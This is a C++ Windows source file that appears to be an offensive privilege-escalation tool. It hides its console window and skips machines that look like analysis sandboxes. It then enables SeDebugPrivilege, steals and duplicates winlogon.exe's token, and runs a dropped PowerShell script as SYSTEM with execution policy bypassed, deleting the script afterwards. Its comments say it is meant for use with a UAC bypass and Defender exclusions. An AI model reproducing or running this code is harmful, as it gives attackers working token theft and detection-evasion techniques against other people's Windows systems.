#include "resource.h";



#pragma comment (lib,"advapi32.lib")

#define PROCESS_ARRAY 2048





std::string wcharToString(wchar_t input[1024])
{
	std::wstring wstringValue(input);
	std::string convertedString(wstringValue.begin(), wstringValue.end());
	return convertedString;
}

void GetTokenInfo(HANDLE TokenHandle)
{
	LPVOID TokenInformation = NULL;
	DWORD TokenInformationLength = 0;
	DWORD ReturnLength;
	SID_NAME_USE SidType;
	GetTokenInformation(TokenHandle, TokenUser, NULL, 0, &ReturnLength);
	PTOKEN_USER pTokenUser = (PTOKEN_USER)GlobalAlloc(GPTR, ReturnLength);
	GetTokenInformation(TokenHandle, TokenUser, pTokenUser, ReturnLength, &ReturnLength);
	wchar_t* userSid = NULL;
	ConvertSidToStringSid(pTokenUser->User.Sid, &userSid);
	std::string sid = wcharToString(userSid);
	TCHAR szGroupName[256];
	TCHAR szDomainName[256];
	DWORD cchGroupName = 256;
	DWORD cchDomainName = 256;
	LookupAccountSid(NULL, pTokenUser->User.Sid, szGroupName, &cchGroupName, szDomainName, &cchDomainName, &SidType);
	std::cout << sid << std::endl;;
}

int LocateWinLogonProcess()
{
	DWORD lpidProcess[PROCESS_ARRAY], lpcbNeeded, cProcesses;
	EnumProcesses(lpidProcess, sizeof(lpidProcess), &lpcbNeeded);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 p32;
	p32.dwSize = sizeof(PROCESSENTRY32);
	int processWinlogonPid;
	if (Process32First(hSnapshot, &p32))
	{
		do {
			if (wcharToString(p32.szExeFile) == "winlogon.exe")
			{
				processWinlogonPid = p32.th32ProcessID;
				return processWinlogonPid;
				break;
			}
		} while (Process32Next(hSnapshot, &p32));

		CloseHandle(hSnapshot);
	}
}


void EnableSeDebugPrivilegePrivilege()
{
	LUID luid;
	HANDLE currentProc = OpenProcess(PROCESS_ALL_ACCESS, false, GetCurrentProcessId());
	if (currentProc)
	{
		HANDLE TokenHandle(NULL);
		BOOL hProcessToken = OpenProcessToken(currentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle);
		if (hProcessToken)
		{
			BOOL checkToken = LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &luid);
			if (!checkToken)
			{
			}
			else
			{
				TOKEN_PRIVILEGES tokenPrivs;
				tokenPrivs.PrivilegeCount = 1;
				tokenPrivs.Privileges[0].Luid = luid;
				tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
				BOOL adjustToken = AdjustTokenPrivileges(TokenHandle, FALSE, &tokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);
				if (adjustToken != 0)
				{
				}
			}
			CloseHandle(TokenHandle);
		}
	}
	CloseHandle(currentProc);
}

BOOL CreateImpersonatedProcess(HANDLE NewToken)
{


	bool NP;
	//bool NP2;
	STARTUPINFO lpStartupInfo = { 0 };
	PROCESS_INFORMATION lpProcessInformation = { 0 };
	lpStartupInfo.cb = sizeof(lpStartupInfo);

	WCHAR exec[] = L"/c powershell.exe -Exec Bypass -F C:\\temp\\test.ps1";

	NP = CreateProcessWithTokenW(NewToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", exec, 0, NULL, NULL, &lpStartupInfo, &lpProcessInformation);

	if (!NP) {
		return -1;
	}



	GetTokenInfo(NewToken);
	CloseHandle(NewToken);
}

BOOL StealToken(int TargetPID)
{
	HANDLE hProcess = NULL;
	HANDLE TokenHandle = NULL;
	HANDLE NewToken = NULL;
	BOOL OpenToken;
	BOOL Impersonate;
	BOOL Duplicate;
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, TargetPID);
	if (!hProcess)
	{
		return -1;
	}

	OpenToken = OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle);
	if (!OpenToken)
	{
		std::cout << GetLastError();
	}

	Impersonate = ImpersonateLoggedOnUser(TokenHandle);
	if (!Impersonate)
	{
		return -1;
	}
	Duplicate = DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &NewToken);
	if (!Duplicate)
	{
		return -1;
	}
	CreateImpersonatedProcess(NewToken);
	CloseHandle(hProcess);
	CloseHandle(TokenHandle);
}

void CheckCurrentProcess()
{
	HANDLE TokenHandle = NULL;
	HANDLE hCurrent = GetCurrentProcess();
	OpenProcessToken(hCurrent, TOKEN_QUERY, &TokenHandle);
	GetTokenInfo(TokenHandle);
	CloseHandle(TokenHandle);
}

HWND getWindow() {
	HWND hWnd = GetConsoleWindow();
	return hWnd;
}

void showit(HWND test) {

	ShowWindow(test, SW_HIDE);

}

BOOL CheckSandbox() {

	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);
	if (systemInfo.dwNumberOfProcessors < 4)
		return TRUE;
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	GlobalMemoryStatusEx(&memoryStatus);
	DWORD RAMsize = memoryStatus.ullTotalPhys / 1024 / 1024;
	if (RAMsize < 2048)
		return TRUE;
	Sleep(5000);
	return FALSE;
}



int main() {
	


	HWND aa = getWindow();
	showit(aa);

	bool c = CheckSandbox();
	if (c == TRUE)
		return 0;

	using namespace std;
	Sleep(300);
	ofstream file;
	// be careful of escape characters
	// this is a RANDOM AF script pulled from my 96th tab --- JUST AN EXAMPLE
	// This will be executed within a UAC bypass function, ADD MP-Preference exclusions 
	file.open("C:\\temp\\test.ps1");
	string powershell = R"(
$filenames = Get-ChildItem \\Shared\TestFolder\*.txt | select -expand fullname
$filenames -match "testfile1.txt"
If ($filenames -eq 'False') {
	 New -Item -Path '\\Shared\TestFolder\testfile1.txt' -ItemType File
}
else {exit}
)";

	


	file << powershell << endl;
	file.close();
	//Sleep(2000);

	CheckCurrentProcess();
	int winLogonPID = LocateWinLogonProcess();
	EnableSeDebugPrivilegePrivilege();
	StealToken(winLogonPID);

	Sleep(30000);
	remove("C:\\temp\\test.ps1");


	return 0;

}
